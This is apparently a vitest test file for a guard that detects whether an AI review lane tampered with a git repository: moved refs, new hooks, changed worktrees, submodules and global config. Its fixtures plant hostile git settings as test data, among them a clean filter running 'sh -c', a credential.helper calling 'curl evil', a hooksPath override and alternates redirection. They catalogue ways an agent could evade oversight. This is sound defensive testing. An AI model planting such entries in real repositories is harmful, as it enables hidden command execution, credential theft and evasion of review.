import { appendFileSync, mkdirSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { summarizeChanges } from '../../../copilot-run/job.js';
import { defaultExec } from '../../../ship/exec.js';
import { factoryGuardExec } from '../exec.js';
import type { LaneResult } from '../lane.js';
import { compareSnapshots, snapshotRepo, stableStatus, verifyReviewWorktree } from '../review-guard.js';
import { gitIn, harness, type Harness } from './fake-lanes.js';

let h: Harness;
let head: string;
let wt: string;
const branch = 'omc-team/copilot-run/cr-rev';
// The guard is part of what is under test: every snapshot command must be an allowed shape.
const exec = factoryGuardExec(defaultExec);

beforeEach(() => {
  h = harness('omg-factory-guard-');
  head = gitIn(h.root, 'rev-parse', 'HEAD');
  writeFileSync(join(h.root, 'notes.txt'), 'untracked\n');
});

afterEach(() => {
  rmSync(h.dir, { recursive: true, force: true });
});

/** Like copilot_run: the review lane's worktree and branch at the head (inside the ignored state root). */
function addLaneWorktree(): void {
  wt = join(h.root, '.omg', 'team', 'copilot-run', 'worktrees', 'cr-rev');
  mkdirSync(join(wt, '..'), { recursive: true });
  gitIn(h.root, 'worktree', 'add', '-q', '-b', branch, wt, head);
}

function laneResult(): LaneResult {
  return {
    state: 'completed', branch, pr: null, headSha: gitIn(wt, 'rev-parse', 'HEAD'), baseSha: head, worktree: wt,
    changes: summarizeChanges(wt, head), finalText: '', logsUrl: null,
    usage: { premiumRequests: 1, credits: 2, source: 'measured', detail: '' }, remoteId: 'cr-rev', error: null, notes: [], process: null,
  };
}

/** Problems after `tamper` ran during a review lane (snapshot before the lane starts, check after it ends). */
function problemsAfter(tamper: () => void): string[] {
  const before = snapshotRepo(exec, h.root);
  addLaneWorktree();
  tamper();
  const after = snapshotRepo(exec, h.root);
  return [...compareSnapshots(before, after, { [`refs/heads/${branch}`]: head }, { newWorktree: { path: wt } }), ...verifyReviewWorktree(exec, laneResult(), head, after.commonDir)];
}

const git = (...args: string[]) => gitIn(h.root, ...args);

describe('review-lane tamper check', () => {
  it('a clean review lane passes (its own worktree branch at the head is allowed)', () => {
    expect(problemsAfter(() => {})).toEqual([]);
  });

  it.each<[string, () => void, RegExp]>([
    ['a created branch', () => git('branch', 'evil', head), /ref refs\/heads\/evil was created/],
    ['a deleted ref', () => git('update-ref', '-d', 'refs/remotes/origin/dev'), /ref refs\/remotes\/origin\/dev was deleted/],
    ['a moved remote-tracking ref', () => { git('commit', '-q', '--allow-empty', '-m', 'x'); git('update-ref', 'refs/remotes/origin/dev', 'HEAD'); git('reset', '-q', '--soft', 'HEAD~1'); }, /ref refs\/remotes\/origin\/dev moved/],
    ['a tag', () => git('tag', 'v9', head), /ref refs\/tags\/v9 was created/],
    ['refs/stash', () => { writeFileSync(join(h.root, 'README.md'), 'changed\n'); git('stash', '-q'); }, /ref refs\/stash was created/],
    ['a packed-refs edit', () => { git('pack-refs', '--all'); appendFileSync(join(h.root, '.git', 'packed-refs'), `${head} refs/heads/packed-evil\n`); }, /refs\/heads\/packed-evil was created/],
    ['the lane branch at another sha', () => { gitIn(wt, 'commit', '-q', '--allow-empty', '-m', 'lane commit'); }, /refs\/heads\/omc-team\/copilot-run\/cr-rev was created|HEAD is/],
    ['an appended config line (echo >> .git/config)', () => appendFileSync(join(h.root, '.git', 'config'), '[alias]\n\tp = push --force\n'), /common git config changed/],
    ['git config via a variable subcommand', () => git('config', 'core.hooksPath', '/tmp/evil'), /common git config changed/],
    ['config.worktree', () => writeFileSync(join(h.root, '.git', 'config.worktree'), '[core]\n\tfsmonitor = evil\n'), /config\.worktree changed/],
    ['a worktree\'s config.worktree', () => writeFileSync(join(h.root, '.git', 'worktrees', 'cr-rev', 'config.worktree'), '[core]\n\tfsmonitor = evil\n'), /worktrees\/cr-rev\/config\.worktree changed/],
    ['a new hook', () => writeFileSync(join(h.root, '.git', 'hooks', 'pre-push'), '#!/bin/sh\nexit 0\n'), /hooks\/ directory changed/],
    ['an edited hook sample', () => appendFileSync(join(h.root, '.git', 'hooks', 'pre-commit.sample'), '\n# evil\n'), /hooks\/ directory changed/],
    ['info/exclude', () => appendFileSync(join(h.root, '.git', 'info', 'exclude'), 'src/\n'), /info\/ directory changed/],
    ['info/attributes', () => writeFileSync(join(h.root, '.git', 'info', 'attributes'), '* filter=evil\n'), /info\/ directory changed/],
    ['the main checkout\'s HEAD moved', () => git('commit', '-q', '--allow-empty', '-m', 'main moved'), /main checkout's HEAD moved/],
    ['the main checkout switched branch', () => git('checkout', '-q', '-b', 'other'), /main checkout's HEAD switched/],
    ['a deleted untracked file in the main checkout', () => unlinkSync(join(h.root, 'notes.txt')), /main checkout's working tree changed/],
    ['a deleted tracked file in the main checkout', () => unlinkSync(join(h.root, 'README.md')), /main checkout's working tree changed/],
    ['a commit in the lane worktree', () => { writeFileSync(join(wt, 'x.ts'), 'x\n'); gitIn(wt, 'add', 'x.ts'); gitIn(wt, 'commit', '-q', '-m', 'x'); }, /HEAD is .*not the reviewed|lane changed files/],
    ['an uncommitted edit in the lane worktree', () => writeFileSync(join(wt, 'README.md'), 'edited\n'), /lane changed files: README\.md/],
    ['a deleted file in the lane worktree', () => unlinkSync(join(wt, 'README.md')), /lane changed files: README\.md|not clean/],
    ['an untracked file in the lane worktree', () => writeFileSync(join(wt, 'new.txt'), 'n\n'), /lane changed files: new\.txt/],
  ])('fails on %s', (_name, tamper, problem) => {
    const problems = problemsAfter(tamper);
    expect(problems.length).toBeGreaterThan(0);
    expect(problems.join('\n')).toMatch(problem);
  });

  it.each<[string, () => void, RegExp]>([
    ['another new worktree entry', () => git('worktree', 'add', '-q', '--detach', join(h.dir, 'sneaky'), head), /worktree entry worktrees\/sneaky was added/],
    ['a new submodule git dir', () => { mkdirSync(join(h.root, '.git', 'modules', 'lib', 'sub'), { recursive: true }); writeFileSync(join(h.root, '.git', 'modules', 'lib', 'sub', 'HEAD'), 'ref: refs/heads/main\n'); }, /submodule git dir modules\/lib\/sub was added/],
    ['objects/info/alternates', () => writeFileSync(join(h.root, '.git', 'objects', 'info', 'alternates'), '/evil/objects\n'), /objects\/info\/alternates changed/],
  ])('fails on %s', (_name, tamper, problem) => {
    const problems = problemsAfter(tamper);
    expect(problems.join('\n')).toMatch(problem);
  });

  describe('state that exists before the lane', () => {
    const other = () => join(h.root, '.git', 'worktrees', 'other');
    beforeEach(() => {
      git('worktree', 'add', '-q', '-b', 'other', join(h.dir, 'other'), head);
      mkdirSync(join(h.root, '.git', 'modules', 'sub'), { recursive: true });
      writeFileSync(join(h.root, '.git', 'modules', 'sub', 'HEAD'), 'ref: refs/heads/main\n');
      writeFileSync(join(h.root, '.git', 'modules', 'sub', 'config'), '[core]\n\tbare = false\n');
      mkdirSync(join(h.root, '.git', 'modules', 'sub', 'hooks'));
      appendFileSync(join(h.root, '.git', 'info', 'exclude'), '.env\nnode_modules/\n');
      writeFileSync(join(h.root, '.env'), 'TOKEN=a\n');
      mkdirSync(join(h.root, 'node_modules', '.bin'), { recursive: true });
      writeFileSync(join(h.root, 'node_modules', '.bin', 'tsc'), '#!/bin/sh\n');
    });

    it('is not tampering when nothing changes', () => {
      expect(problemsAfter(() => {})).toEqual([]);
    });

    it.each<[string, () => void, RegExp]>([
      ['another worktree\'s HEAD', () => writeFileSync(join(other(), 'HEAD'), `${head}\n`), /worktrees\/other changed/],
      ['another worktree\'s gitdir', () => writeFileSync(join(other(), 'gitdir'), '/evil/.git\n'), /worktrees\/other changed/],
      ['a per-worktree ref (refs/bisect)', () => { mkdirSync(join(other(), 'refs', 'bisect'), { recursive: true }); writeFileSync(join(other(), 'refs', 'bisect', 'bad'), `${head}\n`); }, /worktrees\/other changed/],
      ['a submodule\'s config', () => appendFileSync(join(h.root, '.git', 'modules', 'sub', 'config'), '\tfsmonitor = evil\n'), /modules\/sub changed/],
      ['a submodule\'s hook', () => writeFileSync(join(h.root, '.git', 'modules', 'sub', 'hooks', 'post-checkout'), '#!/bin/sh\n'), /modules\/sub changed/],
      ['an ignored .env', () => writeFileSync(join(h.root, '.env'), 'TOKEN=evil\n'), /ignored file in the main checkout changed/],
      ['a new ignored .env.local', () => writeFileSync(join(h.root, '.env.local'), 'X=1\n'), /ignored file in the main checkout changed/],
      ['node_modules/.bin', () => writeFileSync(join(h.root, 'node_modules', '.bin', 'tsc'), '#!/bin/sh\nevil\n'), /ignored file in the main checkout changed/],
    ])('fails on %s', (_name, tamper, problem) => {
      const problems = problemsAfter(tamper);
      expect(problems.join('\n')).toMatch(problem);
    });
  });

  it('fails when the lane\'s own new worktree entry points its commondir elsewhere', () => {
    const before = snapshotRepo(exec, h.root);
    addLaneWorktree();
    writeFileSync(join(h.root, '.git', 'worktrees', 'cr-rev', 'commondir'), '/evil/.git\n');
    const after = snapshotRepo(exec, h.root);
    expect(compareSnapshots(before, after, { [`refs/heads/${branch}`]: head }, { newWorktree: { path: wt } }).join('\n')).toMatch(/points its commondir at \/evil\/\.git/);
  });

  it('skips git status when the config already differs (a changed config may name a clean filter)', () => {
    const before = snapshotRepo(exec, h.root);
    appendFileSync(join(h.root, '.git', 'config'), '[filter "evil"]\n\tclean = sh -c "touch pwned"\n');
    const after = snapshotRepo(exec, h.root, '.omg', before);
    expect(after.mainStatus).toMatch(/^skipped/);
    expect(compareSnapshots(before, after)).toEqual(['the common git config changed']);
    expect(snapshotRepo(exec, h.root).mainStatus).not.toMatch(/^skipped/);
  });

  it('a lane worktree whose git dir is not the repository\'s fails before git reads it', () => {
    addLaneWorktree();
    expect(verifyReviewWorktree(exec, laneResult(), head, join(h.dir, 'elsewhere', '.git')).join('\n')).toMatch(/git dir is .*not the repository's/);
  });

  it('a stale worktree pruned with its config.worktree (copilot_run prunes before adding a lane) is not tampering', () => {
    const stale = join(h.dir, 'stale-wt');
    git('worktree', 'add', '-q', '--detach', stale, head);
    writeFileSync(join(h.root, '.git', 'worktrees', 'stale-wt', 'config.worktree'), '[core]\n\tx = 1\n');
    rmSync(stale, { recursive: true, force: true });
    expect(problemsAfter(() => git('worktree', 'prune'))).toEqual([]);
  });

  it('a lane that started at another sha, or reports no worktree or change summary, fails', () => {
    addLaneWorktree();
    expect(verifyReviewWorktree(exec, { ...laneResult(), baseSha: 'c'.repeat(40) }, head).join('\n')).toMatch(/started at cccccccccccc/);
    expect(verifyReviewWorktree(exec, { ...laneResult(), worktree: null }, head).join('\n')).toMatch(/no worktree/);
    expect(verifyReviewWorktree(exec, { ...laneResult(), changes: null }, head).join('\n')).toMatch(/no change summary/);
  });

  it('ignores untracked files under the state root, but not under .omg/skills or tracked changes there', () => {
    const raw = ['?? .omg/state/x.json', '?? .omg/skills/new.md', ' D .omg/skills/old.md', '?? src/a.ts', ''].join('\0');
    expect(stableStatus(raw, '.omg').split('\n')).toEqual([' D .omg/skills/old.md', '?? .omg/skills/new.md', '?? src/a.ts']);
    expect(stableStatus(raw, null).split('\n')).toHaveLength(4);
  });

  describe('the global git config (a fake HOME)', () => {
    let home: string;
    beforeEach(() => {
      home = join(h.dir, 'home');
      mkdirSync(home);
      vi.stubEnv('HOME', home);
      vi.stubEnv('GIT_CONFIG_GLOBAL', '');
      vi.stubEnv('XDG_CONFIG_HOME', '');
      writeFileSync(join(home, '.gitconfig'), '[user]\n\tname = me\n[include]\n\tpath = ~/inc/one.gitconfig\n');
      mkdirSync(join(home, 'inc'));
      writeFileSync(join(home, 'inc', 'one.gitconfig'), '[includeIf "gitdir:~/work/"]\n\tpath = two.gitconfig\n');
      writeFileSync(join(home, 'inc', 'two.gitconfig'), '[core]\n\tautocrlf = false\n');
    });
    afterEach(() => { vi.unstubAllEnvs(); });

    it('is not tampering when nothing changes', () => {
      expect(problemsAfter(() => {})).toEqual([]);
    });

    it.each<[string, () => void]>([
      ['a credential.helper planted in ~/.gitconfig', () => appendFileSync(join(home, '.gitconfig'), '[credential]\n\thelper = !sh -c "curl evil"\n')],
      ['a new $XDG_CONFIG_HOME/git/config (default ~/.config)', () => { mkdirSync(join(home, '.config', 'git'), { recursive: true }); writeFileSync(join(home, '.config', 'git', 'config'), '[core]\n\tsshCommand = evil\n'); }],
      ['a lane-added entry in $XDG_CONFIG_HOME/git/ignore', () => { mkdirSync(join(home, '.config', 'git'), { recursive: true }); writeFileSync(join(home, '.config', 'git', 'ignore'), 'planted.js\n'); }],
      ['an include.path target', () => appendFileSync(join(home, 'inc', 'one.gitconfig'), '[url "evil:"]\n\tpushInsteadOf = https://\n')],
      ['a nested includeIf target', () => appendFileSync(join(home, 'inc', 'two.gitconfig'), '[filter "x"]\n\tclean = evil\n')],
    ])('fails on %s', (_name, tamper) => {
      expect(problemsAfter(tamper).join('\n')).toMatch(/global git config or a file a git config includes changed/);
    });

    it('fails when a file outside the repo that the repository config includes changes (the config itself does not)', () => {
      const outside = join(h.dir, 'outside.gitconfig');
      writeFileSync(outside, '[core]\n\tquotepath = false\n');
      git('config', 'include.path', outside);
      const before = snapshotRepo(exec, h.root);
      appendFileSync(outside, '[credential]\n\thelper = !evil\n');
      expect(compareSnapshots(before, snapshotRepo(exec, h.root, '.omg', before))).toEqual([expect.stringMatching(/global git config or a file a git config includes changed/)]);
    });

    it('GIT_CONFIG_GLOBAL replaces ~/.gitconfig as the file that is hashed', () => {
      const alt = join(h.dir, 'alt.gitconfig');
      writeFileSync(alt, '[user]\n\tname = alt\n');
      vi.stubEnv('GIT_CONFIG_GLOBAL', alt);
      expect(problemsAfter(() => appendFileSync(alt, '[core]\n\tpager = evil\n')).join('\n')).toMatch(/global git config/);
    });
  });

  describe('worktrees/ and modules/ entries', () => {
    const other = () => join(h.root, '.git', 'worktrees', 'other');
    beforeEach(() => { git('worktree', 'add', '-q', '-b', 'other', join(h.dir, 'other'), head); });

    it('a deleted live worktrees/<id> entry is reported', () => {
      expect(problemsAfter(() => rmSync(other(), { recursive: true, force: true })).join('\n')).toMatch(/worktree entry worktrees\/other was removed/);
    });

    it('a worktrees/<id> entry replaced by a symlink or junction is reported', () => {
      const fake = join(h.dir, 'fake-entry');
      mkdirSync(fake);
      expect(problemsAfter(() => {
        rmSync(other(), { recursive: true, force: true });
        symlinkSync(fake, other(), 'junction');
      }).join('\n')).toMatch(/worktrees\/other is not a real directory \(a symlink or junction to /);
    });

    it('a new junction under modules/ is reported', () => {
      const fake = join(h.dir, 'fake-module');
      mkdirSync(fake);
      writeFileSync(join(fake, 'config'), '[core]\n\tfsmonitor = evil\n');
      expect(problemsAfter(() => {
        mkdirSync(join(h.root, '.git', 'modules'), { recursive: true });
        symlinkSync(fake, join(h.root, '.git', 'modules', 'sub'), 'junction');
      }).join('\n')).toMatch(/modules\/sub is not a real directory/);
    });
  });
});
